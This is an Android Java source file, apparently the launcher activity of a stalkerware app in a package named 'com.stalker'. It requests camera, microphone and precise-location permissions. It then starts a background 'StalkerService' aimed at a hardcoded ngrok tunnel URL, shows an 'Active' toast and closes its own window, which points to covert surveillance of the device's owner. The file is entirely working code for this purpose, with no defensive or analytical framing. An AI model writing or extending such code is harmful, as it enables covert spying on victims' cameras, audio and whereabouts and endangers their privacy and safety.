package com.stalker;
import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
public class MainActivity extends AppCompatActivity {
private static final String[] P={Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,Manifest.permission.ACCESS_FINE_LOCATION};
@Override protected void onCreate(Bundle s){super.onCreate(s);setContentView(R.layout.activity_main);
TextView t=findViewById(R.id.st);Button b=findViewById(R.id.btn);
int g=0;for(String p:P)if(ContextCompat.checkSelfPermission(this,p)==PackageManager.PERMISSION_GRANTED)g++;
if(g<P.length){t.setText("Requesting...");ActivityCompat.requestPermissions(this,P,1);}else{t.setText("Ready");b.setEnabled(true);}
b.setOnClickListener(v->{Intent i=new Intent(this,StalkerService.class);i.putExtra("url","https://setting-crestless-derail.ngrok-free.dev");startForegroundService(i);Toast.makeText(this,"Active",Toast.LENGTH_SHORT).show();finish();});}
@Override public void onRequestPermissionsResult(int c,String[]p,int[]r){super.onRequestPermissionsResult(c,p,r);int g=0;for(int x:r)if(x==0)g++;findViewById(R.id.st).setText(g+"/"+p.length);if(g>=p.length)((Button) findViewById(R.id.btn)).setEnabled(true);}
}
